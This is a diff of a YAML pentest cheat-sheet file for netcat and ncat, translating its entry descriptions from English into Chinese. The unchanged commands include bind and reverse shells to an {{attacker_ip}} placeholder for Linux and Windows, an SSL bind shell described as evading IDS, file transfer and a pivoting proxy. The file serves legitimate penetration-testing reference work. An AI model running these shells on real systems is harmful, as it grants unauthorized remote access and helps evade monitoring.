@@ -3,103 +3,79 @@ tags: [network, security, pentest, shell, transfer, enumeration, scanning]
 
 actions:
   # === BASIC CONNECTIVITY AND SCANNING ===
-  - title: nc - port scanning
+  - title: nc - 端口扫描
     desc: |
-      Performs a basic TCP port scan on a specific target. The -z flag ensures
-      that nc does not send any data once the connection is established, making
-      it ideal for scanning. The -v flag provides verbose output to indicate
-      whether a port is open or closed.
+      对特定目标执行基础 TCP 端口扫描。-z 标志确保 nc 在连接建立后不发送任何数据，非常适合扫描。
+      -v 标志提供详细输出，指示端口是开放还是关闭。
     command: "nc -zv {{target}} {{port_range|1-1000}}"
 
-  - title: nc - banner grabbing
+  - title: nc - Banner 抓取
     desc: |
-      Connects to a specific port to retrieve the service banner. This is a 
-      fundamental step in reconnaissance to identify the software and version 
-      running on a port. Simply connecting and pressing 'Enter' often triggers
-       the service to reveal its identification string.
+      连接到特定端口以获取服务 Banner。这是侦察中识别端口上运行软件和版本的基本步骤。
+      简单连接并按 Enter 通常会触发服务显示其识别字符串。
     command: "nc -v {{target}} {{port}}"
 
   # === LISTENER SETUP ===
-  - title: nc - basic tcp listener
+  - title: nc - 基础 TCP 监听器
     desc: |
-      Sets up a TCP listener on the specified local port. This is frequently used
-      to receive incoming data or to catch a reverse shell during an exploit. 
-      The -l flag tells nc to listen, while -p specifies the port and -v enables
-      verbose logging for incoming connections.
+      在指定本地端口上设置 TCP 监听器。常用于接收传入数据或在利用期间捕获反向 shell。
+      -l 标志告诉 nc 监听，-p 指定端口，-v 为传入连接启用详细日志。
     command: "nc -nlvp {{lport|4444}}"
 
   # === BIND SHELLS ===
-  - title: nc - bind shell linux
+  - title: nc - Linux 绑定 Shell
     desc: |
-      Binds a bash shell to a local port on a Linux system. When a remote user
-      connects to this port, they are immediately granted access to the bash
-      environment. This is highly insecure and should only be used in 
-      controlled environments as it lacks any form of authentication.
+      在 Linux 系统上将 bash shell 绑定到本地端口。当远程用户连接到此端口时，会立即获得 bash 环境的访问权。
+      这非常不安全，因为它没有任何形式的认证，只应在受控环境中使用。
     command: "nc -nlvp {{lport|4444}} -e /bin/bash"
 
-  - title: nc - bind shell windows
+  - title: nc - Windows 绑定 Shell
     desc: |
-      Binds the Windows command prompt (cmd.exe) to a local port. This allows
-      anyone who connects to that port to execute commands on the host machine.
-      Ensure the local firewall is configured to allow traffic on the chosen 
-      port for this to work successfully.
+      将 Windows 命令提示符（cmd.exe）绑定到本地端口。这允许任何连接到该端口的人在主机上执行命令。
+      确保本地防火墙配置为允许所选端口的流量，此操作才能成功。
     command: "nc -nlvp {{lport|4444}} -e cmd.exe"
 
   # === REVERSE SHELLS ===
-  - title: nc - reverse shell linux
+  - title: nc - Linux 反向 Shell
     desc: |
-      Initiates a reverse shell from a Linux target back to an attacker's listener.
-      This technique is used to bypass restrictive inbound firewall rules by 
-      initiating an outbound connection. The attacker must have a listener
-      running (e.g., nc -lvp) on the specified IP and port before executing this.
+      从 Linux 目标发起反向 shell 回连到攻击者的监听器。此技术通过发起出站连接来绕过限制性的入站防火墙规则。
+      执行前攻击者必须在指定 IP 和端口上运行监听器（如 nc -lvp）。
     command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e /bin/bash"
 
-  - title: nc - reverse shell windows
+  - title: nc - Windows 反向 Shell
     desc: |
-      Connects back to an attacker's machine and provides a Windows cmd.exe shell.
-      It is a common method for maintaining access after a successful exploit on
-      a Windows system. Note that modern antivirus or EDR solutions may detect
-      and block this behavior.
+      回连到攻击者的机器并提供 Windows cmd.exe shell。这是在成功利用 Windows 系统后保持访问的常用方法。
+      注意现代杀软或 EDR 方案可能检测并阻止此行为。
     command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e cmd.exe"
 
   # === FILE TRANSFER ===
-  - title: nc - receive file
+  - title: nc - 接收文件
     desc: |
-      Sets up a listener to receive a file and save it to the local disk.
-      The output redirection operator (>) is used to capture the incoming 
-      stream and write it to the specified file name. Start this listener 
-      before the sender starts their connection.
+      设置监听器接收文件并保存到本地磁盘。输出重定向运算符（>）用于捕获传入流并写入指定文件名。
+      在发送方开始连接前先启动此监听器。
     command: "nc -nlvp {{lport|4445}} > {{incoming_file}}"
 
-  - title: nc - send file
+  - title: nc - 发送文件
     desc: |
-      Sends a local file to a remote listener by redirecting the file content 
-      into the nc connection. This is a quick way to transfer scripts, binaries,
-      or data between machines without needing SSH or FTP. The receiver must 
-      be listening for the connection to be successful.
+      通过将文件内容重定向到 nc 连接，将本地文件发送到远程监听器。这是在机器之间传输脚本、二进制或数据的快速方式，无需 SSH 或 FTP。
+      接收方必须正在监听，连接才能成功。
     command: "nc -nv {{target_ip}} {{port|4445}} < {{file_to_send}}"
 
   # === NCAT ADVANCED FEATURES ===
-  - title: ncat - bind shell with ssl and access control
+  - title: ncat - 带 SSL 和访问控制的绑定 Shell
     desc: |
-      Creates an encrypted bind shell that only allows a specific source IP to
-      connect. Using the --ssl flag encrypts the traffic, making it harder for 
-      IDS systems to detect the shell commands. The --allow flag provides a 
-      basic layer of security by filtering who can connect.
+      创建一个仅允许特定源 IP 连接的加密绑定 shell。使用 --ssl 标志加密流量，使 IDS 系统更难检测 shell 命令。
+      --allow 标志通过过滤谁可以连接提供基本的安全层。
     command: "ncat --exec {{shell_path|/bin/bash}} --allow {{allowed_ip}} -vnl {{port|4444}} --ssl"
 
-  - title: ncat - secure connection with ssl
+  - title: ncat - 使用 SSL 的安全连接
     desc: |
-      Connects to a remote listener using SSL/TLS encryption. This is used to
-      interact with ncat listeners that have SSL enabled, ensuring the 
-      entire communication remains private. This can also be used to test
-      SSL-wrapped services like HTTPS or SMTPS.
+      使用 SSL/TLS 加密连接到远程监听器。用于与启用了 SSL 的 ncat 监听器交互，确保整个通信保持私密。
+      也可用于测试 HTTPS 或 SMTPS 等 SSL 封装的服务。
     command: "ncat -v {{target_ip}} {{port|4444}} --ssl"
 
-  - title: ncat - http proxy mode
+  - title: ncat - HTTP 代理模式
     desc: |
-      Turns ncat into a simple HTTP proxy server. This can be used for pivoting
-      traffic through a compromised machine or to route web traffic through
-      a specific network interface. This proxy does not support authentication 
-      in its simplest form.
+      将 ncat 变成一个简单的 HTTP 代理服务器。可用于通过已攻陷的机器进行流量中转，或将 Web 流量路由到特定网络接口。
+      此代理在其最简单的形式下不支持认证。
     command: "ncat --listen --proxy-type http {{lport|8080}}"
